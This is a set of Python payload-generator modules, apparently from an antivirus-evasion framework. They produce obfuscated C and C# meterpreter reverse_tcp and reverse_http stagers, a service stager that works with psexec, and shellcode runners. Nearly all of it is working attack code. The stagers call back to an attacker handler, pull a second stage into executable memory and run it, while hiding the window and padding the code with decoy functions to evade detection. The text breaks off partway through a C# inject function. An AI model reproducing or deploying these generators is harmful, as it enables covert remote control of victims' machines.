        code += "char* %s[%s];" % (char_array_name_3, number_of_strings_3)
        
        # first string obfuscation method
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_1, char_array_name_1, stringGenFunctions[0][0])
        
        # read the full server response into the buffer
        code += "char * %s = %s;" % (buf_counter_name,buffer_name)
        code += "int %s; do {" % (bytes_read_name)
        code += "%s = recv(%s, %s, 1024, 0);" % (bytes_read_name, my_socket_name, buf_counter_name)
        code += "%s += %s; }" % (buf_counter_name,bytes_read_name)
        code += "while ( %s > 0 );" % (bytes_read_name)

        # malloc our third string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_3, char_array_name_3, random.randint(max_string_length,global_max_string_length))
        
        # second string obfuscation method
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_2, char_array_name_2, stringGenFunctions[1][0])
        
        # real code
        code += "closesocket(%s); WSACleanup();" %(my_socket_name)
        code += "((void (*)())strstr(%s, \"\\r\\n\\r\\n\") + 4)();" %(buffer_name)

        # third string obfuscation method (never called)
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_3, char_array_name_3, stringGenFunctions[2][0])        
        code += "} return; }\n"

        # service control handler code
        code += """void ControlHandler(DWORD request) 
    { 
        switch(request) 
        { 
            case SERVICE_CONTROL_STOP: 
                ServiceStatus.dwWin32ExitCode = 0; 
                ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
                SetServiceStatus (%s, &ServiceStatus);
                return; 
            case SERVICE_CONTROL_SHUTDOWN: 
                ServiceStatus.dwWin32ExitCode = 0; 
                ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
                SetServiceStatus (%s, &ServiceStatus);
                return; 
            default:
                break;
        } 
        SetServiceStatus (%s,  &ServiceStatus);
        return; 
    } 
    """ %(hStatusName, hStatusName, hStatusName)

        return code
    
########NEW FILE########
__FILENAME__ = rev_tcp
"""

Obfuscated, pure C windows/meterpreter/reverse_tcp

Implements various randomized string processing functions in an
attempt to obfuscate the call tree.

Inspiration from https://github.com/rsmudge/metasploit-loader

Module built by @harmj0y

"""

import random
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.language = "c"
        self.extension = "c"
        self.rating = "Excellent"
        
        # optional
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {"LHOST" : ["", "IP of the metasploit handler"],
                                "LPORT" : ["4444", "Port of the metasploit handler"],
                                "compile_to_exe" : ["Y", "Compile to an executable"]}
        
    def generate(self):
            
        winsock_init_name = helpers.randomString()
        punt_name = helpers.randomString()
        recv_all_name = helpers.randomString()
        wsconnect_name = helpers.randomString()
        
        # the real includes needed
        includes = [ "#include <stdio.h>" , "#include <stdlib.h>", "#include <windows.h>", "#include <string.h>"]
        
        # max length string for obfuscation
        global_max_string_length = 10000
        max_string_length = random.randint(100,global_max_string_length)
        max_num_strings = 10000
        
        # TODO: add in more string processing functions
        randName1 = helpers.randomString() # reverse()
        randName2 = helpers.randomString() # doubles characters
        stringModFunctions = [  (randName1, "char* %s(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\\0'; return t2; }" %(randName1)), 
                                (randName2, "char* %s(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\\0'; return result; }" %(randName2))
                            ]
                            
        helpers.shuffle(stringModFunctions)
        
        # obfuscation "logical nop" string generation functions
        randString1 = helpers.randomString(50)
        randName1 = helpers.randomString()
        randVar1 = helpers.randomString()
        randName2 = helpers.randomString()
        randVar2 = helpers.randomString()
        randVar3 = helpers.randomString()
        randName3 = helpers.randomString()
        randVar4 = helpers.randomString()
        randVar5 = helpers.randomString()

        stringGenFunctions = [  (randName1, "char* %s(){ char *%s = %s(\"%s\"); return strstr( %s, \"%s\" );}" %(randName1, randVar1, stringModFunctions[0][0], randString1, randVar1, randString1[len(randString1)/2])),
                                (randName2, "char* %s(){ char %s[%s], %s[%s/2]; strcpy(%s,\"%s\"); strcpy(%s,\"%s\"); return %s(strcat( %s, %s)); }" % (randName2, randVar2, max_string_length, randVar3, max_string_length, randVar2, helpers.randomString(50), randVar3, helpers.randomString(50), stringModFunctions[1][0], randVar2, randVar3)),
                                (randName3, "char* %s() { char %s[%s] = \"%s\"; char *%s = strupr(%s); return strlwr(%s); }" % (randName3, randVar4, max_string_length, helpers.randomString(50), randVar5, randVar4, randVar5))
                             ]
        helpers.shuffle(stringGenFunctions)
        
        # obfuscation - add in our fake includes
        fake_includes = ["#include <sys/timeb.h>", "#include <time.h>", "#include <math.h>", "#include <signal.h>", "#include <stdarg.h>", 
                        "#include <limits.h>", "#include <assert.h>"]
        t = random.randint(1,7)
        for x in xrange(1, random.randint(1,7)):
            includes.append(fake_includes[x])
        
        # shuffle up real/fake includes
        helpers.shuffle(includes)
        
        code = "#define _WIN32_WINNT 0x0500\n"
        code += "#include <winsock2.h>\n"
        code += "\n".join(includes) + "\n"

        #string mod functions
        code += stringModFunctions[0][1] + "\n"
        code += stringModFunctions[1][1] + "\n"
        
        # build the winsock_init function
        wVersionRequested_name = helpers.randomString()
        wsaData_name = helpers.randomString()
        code += "void %s() {" % (winsock_init_name)
        code += "WORD %s = MAKEWORD(%s, %s); WSADATA %s;" % (wVersionRequested_name, helpers.obfuscateNum(2,4), helpers.obfuscateNum(2,4), wsaData_name)
        code += "if (WSAStartup(%s, &%s) < 0) { WSACleanup(); exit(1);}}\n" %(wVersionRequested_name,wsaData_name)
        
        # first logical nop string function
        code += stringGenFunctions[0][1] + "\n"
        
        # build punt function
        my_socket_name = helpers.randomString()
        code += "void %s(SOCKET %s) {" %(punt_name, my_socket_name)
        code += "closesocket(%s);" %(my_socket_name)
        code += "WSACleanup();"
        code += "exit(1);}\n"
        
        # second logical nop string function
        code += stringGenFunctions[1][1] + "\n"
        
        # build recv_all function
        my_socket_name = helpers.randomString()
        buffer_name = helpers.randomString()
        len_name = helpers.randomString()
        code += "int %s(SOCKET %s, void * %s, int %s){" %(recv_all_name, my_socket_name, buffer_name, len_name)
        code += "int slfkmklsDSA=0;int rcAmwSVM=0;"
        code += "void * startb = %s;" %(buffer_name)
        code += "while (rcAmwSVM < %s) {" %(len_name)
        code += "slfkmklsDSA = recv(%s, (char *)startb, %s - rcAmwSVM, 0);" %(my_socket_name, len_name)
        code += "startb += slfkmklsDSA; rcAmwSVM   += slfkmklsDSA;"
        code += "if (slfkmklsDSA == SOCKET_ERROR) %s(%s);} return rcAmwSVM; }\n" %(punt_name, my_socket_name)

        # third logical nop string function
        code += stringGenFunctions[2][1] + "\n"
        
        # build wsconnect function
        target_name = helpers.randomString()
        sock_name = helpers.randomString()
        my_socket_name = helpers.randomString()
        code += "SOCKET %s() { struct hostent * %s; struct sockaddr_in %s; SOCKET %s;" % (wsconnect_name, target_name, sock_name, my_socket_name)
        code += "%s = socket(AF_INET, SOCK_STREAM, 0);" %(my_socket_name)
        code += "if (%s == INVALID_SOCKET) %s(%s);" %(my_socket_name, punt_name, my_socket_name);
        code += "%s = gethostbyname(\"%s\");" %(target_name, self.required_options["LHOST"][0])
        code += "if (%s == NULL) %s(%s);" %(target_name, punt_name, my_socket_name)
        code += "memcpy(&%s.sin_addr.s_addr, %s->h_addr, %s->h_length);" %(sock_name, target_name, target_name)
        code += "%s.sin_family = AF_INET;" %(sock_name)
        code += "%s.sin_port = htons(%s);" %(sock_name, helpers.obfuscateNum(int(self.required_options["LPORT"][0]),32))
        code += "if ( connect(%s, (struct sockaddr *)&%s, sizeof(%s)) ) %s(%s);" %(my_socket_name, sock_name, sock_name, punt_name, my_socket_name)
        code += "return %s;}\n" %(my_socket_name)
        
        # build main() code
        size_name = helpers.randomString()
        buffer_name = helpers.randomString()
        function_name = helpers.randomString()
        my_socket_name = helpers.randomString()
        count_name = helpers.randomString()
        
        # obfuscation stuff
        char_array_name_1 = helpers.randomString()
        number_of_strings_1 = random.randint(1,max_num_strings)
        char_array_name_2 = helpers.randomString()
        number_of_strings_2 = random.randint(1,max_num_strings)
        char_array_name_3 = helpers.randomString()
        number_of_strings_3 = random.randint(1,max_num_strings)
        
        code += "int main(int argc, char * argv[]) {"
        code += "ShowWindow( GetConsoleWindow(), SW_HIDE );"
        code += "ULONG32 %s;" %(size_name)
        code += "char * %s;" %(buffer_name)
        code += "int i;"
        code += "char* %s[%s];" % (char_array_name_1, number_of_strings_1)
        code += "void (*%s)();" %(function_name)
        
        # malloc our first string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_1, char_array_name_1, random.randint(max_string_length,global_max_string_length)) 
        
        code += "%s();" %(winsock_init_name)
        code += "char* %s[%s];" % (char_array_name_2, number_of_strings_2)
        code += "SOCKET %s = %s();" %(my_socket_name,wsconnect_name)
        
        # malloc our second string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_2, char_array_name_2, random.randint(max_string_length,global_max_string_length))
        
        code += "int %s = recv(%s, (char *)&%s, %s, 0);" % (count_name, my_socket_name, size_name, helpers.obfuscateNum(4,2))
        code += "if (%s != %s || %s <= 0) %s(%s);" %(count_name, helpers.obfuscateNum(4,2), size_name, punt_name, my_socket_name)
        
        code += "%s = VirtualAlloc(0, %s + %s, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" %(buffer_name, size_name, helpers.obfuscateNum(5,2))
        code += "char* %s[%s];" % (char_array_name_3, number_of_strings_3)
        
        # first string obfuscation method
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_1, char_array_name_1, stringGenFunctions[0][0])
        
        # real code
        code += "if (%s == NULL) %s(%s);" %(buffer_name, punt_name, my_socket_name)
        code += "%s[0] = 0xBF;" %(buffer_name)
        code += "memcpy(%s + 1, &%s, %s);" %(buffer_name, my_socket_name, helpers.obfuscateNum(4,2))
        
        # malloc our third string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_3, char_array_name_3, random.randint(max_string_length,global_max_string_length))
        
        # second string obfuscation method
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_2, char_array_name_2, stringGenFunctions[1][0])
        
        # real code
        code += "%s = %s(%s, %s + %s, %s);" %(count_name, recv_all_name, my_socket_name, buffer_name, helpers.obfuscateNum(5,2), size_name) 
        code += "%s = (void (*)())%s;" %(function_name, buffer_name)
        code += "%s();" %(function_name)
        
        # third string obfuscation method (never called)
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_3, char_array_name_3, stringGenFunctions[2][0])
        
        code += "return 0;}\n"

        return code

########NEW FILE########
__FILENAME__ = rev_tcp_service
"""

Obfuscated, pure C windows/meterpreter/reverse_tcp service

Compatible with psexec

Implements various randomized string processing functions in an
attempt to obfuscate the call tree.

Inspiration from https://github.com/rsmudge/metasploit-loader

Module built by @harmj0y

"""

import random
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp windows service stager compatible with psexec, no shellcode"
        self.language = "c"
        self.extension = "c"
        self.rating = "Excellent"
        
        # optional
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {"LHOST" : ["", "IP of the metasploit handler"],
                                "LPORT" : ["4444", "Port of the metasploit handler"],
                                "compile_to_exe" : ["Y", "Compile to an executable"]}
        
    def generate(self):
            
        winsock_init_name = helpers.randomString()
        punt_name = helpers.randomString()
        recv_all_name = helpers.randomString()
        wsconnect_name = helpers.randomString()
        
        # the real includes needed
        includes = [ "#include <stdio.h>" , "#include <stdlib.h>", "#include <windows.h>", "#include <string.h>"]
        
        # max length string for obfuscation
        global_max_string_length = 10000
        max_string_length = random.randint(100,global_max_string_length)
        max_num_strings = 10000
        
        
        # TODO: add in more string processing functions
        randName1 = helpers.randomString() # reverse()
        randName2 = helpers.randomString() # doubles characters
        stringModFunctions = [  (randName1, "char* %s(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\\0'; return t2; }" %(randName1)), 
                                (randName2, "char* %s(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\\0'; return result; }" %(randName2))
                            ]
                            
        helpers.shuffle(stringModFunctions)
        
        # obsufcation - "logical nop" string generation functions
        randString1 = helpers.randomString(50)
        randName1 = helpers.randomString()
        randVar1 = helpers.randomString()
        randName2 = helpers.randomString()
        randVar2 = helpers.randomString()
        randVar3 = helpers.randomString()
        randName3 = helpers.randomString()
        randVar4 = helpers.randomString()
        randVar5 = helpers.randomString()
        stringGenFunctions = [  (randName1, "char* %s(){ char *%s = %s(\"%s\"); return strstr( %s, \"%s\" );}" %(randName1, randVar1, stringModFunctions[0][0], randString1, randVar1, randString1[len(randString1)/2])),
                                (randName2, "char* %s(){ char %s[%s], %s[%s/2]; strcpy(%s,\"%s\"); strcpy(%s,\"%s\"); return %s(strcat( %s, %s)); }" % (randName2, randVar2, max_string_length, randVar3, max_string_length, randVar2, helpers.randomString(50), randVar3, helpers.randomString(50), stringModFunctions[1][0], randVar2, randVar3)),
                                (randName3, "char* %s() { char %s[%s] = \"%s\"; char *%s = strupr(%s); return strlwr(%s); }" % (randName3, randVar4, max_string_length, helpers.randomString(50), randVar5, randVar4, randVar5))
                             ]
        helpers.shuffle(stringGenFunctions)
        
        # obfuscation - add in our fake includes
        fake_includes = ["#include <sys/timeb.h>", "#include <time.h>", "#include <math.h>", "#include <signal.h>", "#include <stdarg.h>", 
                        "#include <limits.h>", "#include <assert.h>"]
        t = random.randint(1,7)
        for x in xrange(1, random.randint(1,7)):
            includes.append(fake_includes[x])
        
        # obsufcation - shuffle up our real and fake includes
        helpers.shuffle(includes)

        code = "#define _WIN32_WINNT 0x0500\n"
        code += "#include <winsock2.h>\n"
        code += "\n".join(includes) + "\n"
        
            
        # real - service related headers (check the stub)
        hStatusName = helpers.randomString()
        serviceHeaders = ["SERVICE_STATUS ServiceStatus;","SERVICE_STATUS_HANDLE %s;" %(hStatusName), "void  ServiceMain(int argc, char** argv);", "void  ControlHandler(DWORD request);"]
        helpers.shuffle(serviceHeaders)
        
        code += "\n".join(serviceHeaders)
        
        # obsufcation - string mod functions
        code += stringModFunctions[0][1] + "\n"
        code += stringModFunctions[1][1] + "\n"
        
        # real - build the winsock_init function
        wVersionRequested_name = helpers.randomString()
        wsaData_name = helpers.randomString()
        code += "void %s() {" % (winsock_init_name)
        code += "WORD %s = MAKEWORD(%s, %s); WSADATA %s;" % (wVersionRequested_name, helpers.obfuscateNum(2,4),helpers.obfuscateNum(2,4), wsaData_name)
        code += "if (WSAStartup(%s, &%s) < 0) { WSACleanup(); exit(1);}}\n" %(wVersionRequested_name,wsaData_name)
        
        # first logical nop string function
        code += stringGenFunctions[0][1] + "\n"
        
        # real - build punt function
        my_socket_name = helpers.randomString()
        code += "void %s(SOCKET %s) {" %(punt_name, my_socket_name)
        code += "closesocket(%s);" %(my_socket_name)
        code += "WSACleanup();"
        code += "exit(1);}\n"
        
        # obsufcation - second logical nop string function
        code += stringGenFunctions[1][1] + "\n"
        
        # real - build recv_all function
        my_socket_name = helpers.randomString()
        buffer_name = helpers.randomString()
        len_name = helpers.randomString()
        code += "int %s(SOCKET %s, void * %s, int %s){" %(recv_all_name, my_socket_name, buffer_name, len_name)
        code += "int slfkmklsDSA=0;int rcAmwSVM=0;"
        code += "void * startb = %s;" %(buffer_name)
        code += "while (rcAmwSVM < %s) {" %(len_name)
        code += "slfkmklsDSA = recv(%s, (char *)startb, %s - rcAmwSVM, 0);" %(my_socket_name, len_name)
        code += "startb += slfkmklsDSA; rcAmwSVM   += slfkmklsDSA;"
        code += "if (slfkmklsDSA == SOCKET_ERROR) %s(%s);} return rcAmwSVM; }\n" %(punt_name, my_socket_name)

        # obsufcation - third logical nop string function
        code += stringGenFunctions[2][1] + "\n"

        # real - build wsconnect function
        target_name = helpers.randomString()
        sock_name = helpers.randomString()
        my_socket_name = helpers.randomString()
        code += "SOCKET %s() { struct hostent * %s; struct sockaddr_in %s; SOCKET %s;" % (wsconnect_name, target_name, sock_name, my_socket_name)
        code += "%s = socket(AF_INET, SOCK_STREAM, 0);" %(my_socket_name)
        code += "if (%s == INVALID_SOCKET) %s(%s);" %(my_socket_name, punt_name, my_socket_name);
        code += "%s = gethostbyname(\"%s\");" %(target_name, self.required_options["LHOST"][0])
        code += "if (%s == NULL) %s(%s);" %(target_name, punt_name, my_socket_name)
        code += "memcpy(&%s.sin_addr.s_addr, %s->h_addr, %s->h_length);" %(sock_name, target_name, target_name)
        code += "%s.sin_family = AF_INET;" %(sock_name)
        code += "%s.sin_port = htons(%s);" %(sock_name, helpers.obfuscateNum(int(self.required_options["LPORT"][0]),32))
        code += "if ( connect(%s, (struct sockaddr *)&%s, sizeof(%s)) ) %s(%s);" %(my_socket_name, sock_name, sock_name, punt_name, my_socket_name)
        code += "return %s;}\n" %(my_socket_name)
        
        
        # real - main() method for the service code
        serviceName = helpers.randomString()
        code += "void main() { SERVICE_TABLE_ENTRY ServiceTable[2];"
        serviceTableEntries = [ "ServiceTable[0].lpServiceName = \"%s\";" %(serviceName), 
                                "ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;",
                                "ServiceTable[1].lpServiceName = NULL;",
                                "ServiceTable[1].lpServiceProc = NULL;"]
        helpers.shuffle(serviceTableEntries)
        code += "\n".join(serviceTableEntries)
        code += "StartServiceCtrlDispatcher(ServiceTable);}\n"
        

        # real - service status options for us to shuffle
        serviceStatusOptions = ["ServiceStatus.dwWin32ExitCode = 0;",
                                "ServiceStatus.dwCurrentState = SERVICE_START_PENDING;",
                                "ServiceStatus.dwWaitHint = 0;",
                                "ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;",
                                "ServiceStatus.dwServiceSpecificExitCode = 0;",
                                "ServiceStatus.dwCheckPoint = 0;",
                                "ServiceStatus.dwServiceType = SERVICE_WIN32;"]
        helpers.shuffle(serviceStatusOptions)
        
        # real - serviceMain() code
        code += "void ServiceMain(int argc, char** argv) {\n"
        code += "\n".join(serviceStatusOptions)
        
        code += "%s = RegisterServiceCtrlHandler( \"%s\", (LPHANDLER_FUNCTION)ControlHandler);" %(hStatusName, serviceName)
        code += "if (%s == (SERVICE_STATUS_HANDLE)0) return;" %(hStatusName)
        code += "ServiceStatus.dwCurrentState = SERVICE_RUNNING;"
        code += "SetServiceStatus (%s, &ServiceStatus);" %(hStatusName)
        
        code += "while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {\n"
        
        # obsufcation - random variable names
        size_name = helpers.randomString()
        buffer_name = helpers.randomString()
        function_name = helpers.randomString()
        my_socket_name = helpers.randomString()
        count_name = helpers.randomString()
        
        # obsufcation - necessary declarations
        char_array_name_1 = helpers.randomString()
        number_of_strings_1 = random.randint(1,max_num_strings)
        char_array_name_2 = helpers.randomString()
        number_of_strings_2 = random.randint(1,max_num_strings)
        char_array_name_3 = helpers.randomString()
        number_of_strings_3 = random.randint(1,max_num_strings)
        
        # real - necessary declarations
        code += "ULONG32 %s;" %(size_name)
        code += "char * %s;" %(buffer_name)
        code += "int i;"
        code += "char* %s[%s];" % (char_array_name_1, number_of_strings_1)
        code += "void (*%s)();" %(function_name)
        
        # obsufcation - malloc our first string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_1, char_array_name_1, random.randint(max_string_length,global_max_string_length)) 
        
        code += "%s();" %(winsock_init_name)
        code += "char* %s[%s];" % (char_array_name_2, number_of_strings_2)
        code += "SOCKET %s = %s();" %(my_socket_name,wsconnect_name)
        
        # obsufcation - malloc our second string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_2, char_array_name_2, random.randint(max_string_length,global_max_string_length))
        
        # real - receive the 4 byte size from the handler
        code += "int %s = recv(%s, (char *)&%s, %s, 0);" % (count_name, my_socket_name, size_name, helpers.obfuscateNum(4,2))
        # real - punt the socket if something goes wrong
        code += "if (%s != %s || %s <= 0) %s(%s);" %(count_name, helpers.obfuscateNum(4,2), size_name, punt_name, my_socket_name)
        
        # real - virtual alloc space for the meterpreter .dll
        code += "%s = VirtualAlloc(0, %s + %s, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" %(buffer_name, size_name, helpers.obfuscateNum(5,2))
        
        # obsufcation - declare space for our 3 string obfuscation array
        code += "char* %s[%s];" % (char_array_name_3, number_of_strings_3)
        
        # obsufcation - first string obfuscation method
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_1, char_array_name_1, stringGenFunctions[0][0])
        
        # real - check if the buffer received is null, if so punt the socket
        code += "if (%s == NULL) %s(%s);" %(buffer_name, punt_name, my_socket_name)
        
        # real - prepend some buffer magic to push the socket number onto the stack
        code += "%s[0] = 0xBF;" %(buffer_name)
        # real-  copy the 4 magic bytes into the buffer
        code += "memcpy(%s + 1, &%s, %s);" %(buffer_name, my_socket_name, helpers.obfuscateNum(4,2))
        
        # obsufcation - malloc our third string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_3, char_array_name_3, random.randint(max_string_length,global_max_string_length))
        
        # obsufcation - second string obfuscation method
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_2, char_array_name_2, stringGenFunctions[1][0])
        
        # real - receive all data from the socket
        code += "%s = %s(%s, %s + %s, %s);" %(count_name, recv_all_name, my_socket_name, buffer_name, helpers.obfuscateNum(5,2), size_name) 
        code += "%s = (void (*)())%s;" %(function_name, buffer_name)
        code += "%s();" %(function_name)
        
        # obsufcation - third string obfuscation method (never called)
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_3, char_array_name_3, stringGenFunctions[2][0])
        
        code += "} return; }\n"

        # service control handler code
        code += """void ControlHandler(DWORD request) 
    { 
        switch(request) 
        { 
            case SERVICE_CONTROL_STOP: 
                ServiceStatus.dwWin32ExitCode = 0; 
                ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
                SetServiceStatus (%s, &ServiceStatus);
                return; 
            case SERVICE_CONTROL_SHUTDOWN: 
                ServiceStatus.dwWin32ExitCode = 0; 
                ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
                SetServiceStatus (%s, &ServiceStatus);
                return; 
            default:
                break;
        } 
        SetServiceStatus (%s,  &ServiceStatus);
        return; 
    } 
    """ %(hStatusName, hStatusName, hStatusName)

        return code

########NEW FILE########
__FILENAME__ = virtual
"""

C version of the VirtualAlloc pattern invoker.

Code adapted from:
http://www.debasish.in/2012/08/experiment-with-run-time.html


module by @christruncer

"""

from modules.common import shellcode
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required options
        self.description = "C VirtualAlloc method for inline shellcode injection"
        self.language = "c"
        self.rating = "Poor"
        self.extension = "c"

        self.shellcode = shellcode.Shellcode()
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}

    def generate(self):
        
        # Generate Shellcode Using msfvenom
        Shellcode = self.shellcode.generate()
        
        # Generate Random Variable Names
        RandShellcode = helpers.randomString()
        RandReverseShell = helpers.randomString()
        RandMemoryShell = helpers.randomString()

        # Start creating our C payload
        PayloadCode = '#include <windows.h>\n'
        PayloadCode += '#include <stdio.h>\n'
        PayloadCode += '#include <string.h>\n'
        PayloadCode += 'int main()\n'
        PayloadCode += '{\n'
        PayloadCode += '    LPVOID lpvAddr;\n'
        PayloadCode += '    HANDLE hHand;\n'
        PayloadCode += '    DWORD dwWaitResult;\n'
        PayloadCode += '    DWORD threadID;\n\n'
        PayloadCode += 'unsigned char buff[] = \n'
        PayloadCode += '\"' + Shellcode + '\";\n\n'
        PayloadCode += 'lpvAddr = VirtualAlloc(NULL, strlen(buff),0x3000,0x40);\n'
        PayloadCode += 'RtlMoveMemory(lpvAddr,buff, strlen(buff));\n'
        PayloadCode += 'hHand = CreateThread(NULL,0,lpvAddr,NULL,0,&threadID);\n'
        PayloadCode += 'dwWaitResult = WaitForSingleObject(hHand,INFINITE);\n'
        PayloadCode += 'return 0;\n'
        PayloadCode += '}\n'

        return PayloadCode

########NEW FILE########
__FILENAME__ = void
"""

Simple C void * shellcode invoker.

Code adapted from:
https://github.com/rapid7/metasploit-framework/blob/master/data/templates/src/pe/exe/template.c


module by @christruncer

"""

from modules.common import shellcode
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required options
        self.description = "C VoidPointer cast method for inline shellcode injection"
        self.language = "c"
        self.rating = "Poor"
        self.extension = "c"
        
        self.shellcode = shellcode.Shellcode()
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}

    def generate(self):
        
        # Generate Shellcode Using msfvenom
        Shellcode = self.shellcode.generate()

        # Generate Random Variable Names
        RandShellcode = helpers.randomString()
        RandReverseShell = helpers.randomString()
        RandMemoryShell = helpers.randomString()

        # Start creating our C payload
        PayloadCode = 'unsigned char payload[]=\n'
        PayloadCode += '\"' + Shellcode + '\";\n'
        PayloadCode += 'int main(void) { ((void (*)())payload)();}\n'
        
        return PayloadCode

########NEW FILE########
__FILENAME__ = rev_http
"""

Custom-written pure c# meterpreter/reverse_http stager.
Uses basic variable renaming obfuscation.

Module built by @harmj0y

"""

from modules.common import helpers
import random

class Payload:
    
    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Excellent"

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"LHOST"            : ["", "IP of the metasploit handler"],
                                 "LPORT"            : ["8080", "Port of the metasploit handler"],
                                 "compile_to_exe"   : ["Y", "Compile to an executable"]}
        
        
    def generate(self):

        # imports and namespace setup
        payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;\n"
        payloadCode += "namespace %s { class %s {\n" % (helpers.randomString(), helpers.randomString())

        # code for the randomString() function
        randomStringName = helpers.randomString()
        bufferName = helpers.randomString()
        charsName = helpers.randomString()
        t = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
        random.shuffle(t)
        chars = ''.join(t)

        payloadCode += "static string %s(Random r, int s) {\n" %(randomStringName)
        payloadCode += "char[] %s = new char[s];\n"%(bufferName)
        payloadCode += "string %s = \"%s\";\n" %(charsName, chars)
        payloadCode += "for (int i = 0; i < s; i++){ %s[i] = %s[r.Next(%s.Length)];}\n" %(bufferName, charsName, charsName)
        payloadCode += "return new string(%s);}\n" %(bufferName)


        # code for the checksum8() function
        checksum8Name = helpers.randomString()
        payloadCode += "static bool %s(string s) {return ((s.ToCharArray().Select(x => (int)x).Sum()) %% 0x100 == 92);}\n" %(checksum8Name)


        # code fo the genHTTPChecksum() function
        genHTTPChecksumName = helpers.randomString()
        baseStringName = helpers.randomString()
        randCharsName = helpers.randomString()
        urlName = helpers.randomString()
        random.shuffle(t)
        randChars = ''.join(t)

        payloadCode += "static string %s(Random r) { string %s = \"\";\n" %(genHTTPChecksumName,baseStringName)
        payloadCode += "for (int i = 0; i < 64; ++i) { %s = %s(r, 3);\n" %(baseStringName,randomStringName)
        payloadCode += "string %s = new string(\"%s\".ToCharArray().OrderBy(s => (r.Next(2) %% 2) == 0).ToArray());\n" %(randCharsName,randChars)
        payloadCode += "for (int j = 0; j < %s.Length; ++j) {\n" %(randCharsName)
        payloadCode += "string %s = %s + %s[j];\n" %(urlName,baseStringName,randCharsName)
        payloadCode += "if (%s(%s)) {return %s;}}} return \"9vXU\";}"%(checksum8Name,urlName, urlName)


        # code for getData() function
        getDataName = helpers.randomString()
        strName = helpers.randomString()
        webClientName = helpers.randomString()
        sName = helpers.randomString()

        payloadCode += "static byte[] %s(string %s) {\n" %(getDataName,strName)
        payloadCode += "WebClient %s = new System.Net.WebClient();\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\");\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"Accept\", \"*/*\");\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"Accept-Language\", \"en-gb,en;q=0.5\");\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"Accept-Charset\", \"ISO-8859-1,utf-8;q=0.7,*;q=0.7\");\n" %(webClientName)
        payloadCode += "byte[] %s = null;\n" %(sName)
        payloadCode += "try { %s = %s.DownloadData(%s);\n" %(sName, webClientName, strName)
        payloadCode += "if (%s.Length < 100000) return null;}\n" %(sName)
        payloadCode += "catch (WebException) {}\n"
        payloadCode += "return %s;}\n" %(sName)


        # code fo the inject() function to inject shellcode
        injectName = helpers.randomString()
        sName = helpers.randomString()
        funcAddrName = helpers.randomString()
        hThreadName = helpers.randomString()
        threadIdName = helpers.randomString()
        pinfoName = helpers.randomString()

        payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
        payloadCode += "    if (%s != null) {\n" %(sName)
